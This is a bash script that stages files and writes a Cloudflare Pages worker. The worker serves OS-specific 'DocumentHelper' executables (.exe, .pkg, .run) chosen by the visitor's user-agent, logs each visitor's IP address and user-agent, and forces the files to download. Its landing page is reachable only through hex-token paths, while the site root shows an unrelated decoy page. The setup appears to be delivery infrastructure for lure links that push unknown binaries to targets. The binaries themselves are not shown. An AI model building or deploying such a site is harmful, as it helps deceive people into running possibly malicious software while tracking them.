#!/bin/bash
set -e
mkdir -p /tmp/pages/dl
cp /var/www/send/index.html /tmp/pages/index.html
cp /var/www/reyessitework/index.html /tmp/pages/about.html
cp /var/www/send/dl/DocumentHelper.exe /var/www/send/dl/DocumentHelper.pkg /var/www/send/dl/DocumentHelper.run /tmp/pages/dl/
cat > /tmp/pages/_worker.js <<'WEOF'
export default {
  async fetch(req, env) {
    const ua = req.headers.get('user-agent') || '';
    const u = new URL(req.url);

    if (u.pathname === '/get') {
      const f = /Windows/.test(ua)  ? 'DocumentHelper.exe'
              : /Macintosh/.test(ua) ? 'DocumentHelper.pkg'
              : /Linux/.test(ua)     ? 'DocumentHelper.run'
              : 'DocumentHelper.exe';
      console.log(JSON.stringify({
        ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
        ua, file: f, path: u.pathname
      }));
      return new Response(null, {
        status: 302,
        headers: { Location: `/dl/${f}`, 'Cache-Control': 'no-store' }
      });
    }

    if (u.pathname.startsWith('/dl/')) {
      const r = await env.ASSETS.fetch(req);
      const h = new Headers(r.headers);
      h.set('Content-Disposition', 'attachment');
      h.set('X-Content-Type-Options', 'nosniff');
      h.set('Cache-Control', 'no-store');
      return new Response(r.body, { status: r.status, headers: h });
    }

    if (/^\/f\/[a-f0-9]{8}$/.test(u.pathname)) {
      return env.ASSETS.fetch(new Request(new URL('/index.html', u), req));
    }

    if (u.pathname === '/') {
      return env.ASSETS.fetch(new Request(new URL('/about.html', u), req));
    }

    return env.ASSETS.fetch(req);
  }
};
WEOF
chmod 644 /tmp/pages/_worker.js /tmp/pages/index.html /tmp/pages/about.html /tmp/pages/dl/*
ls -la /tmp/pages /tmp/pages/dl
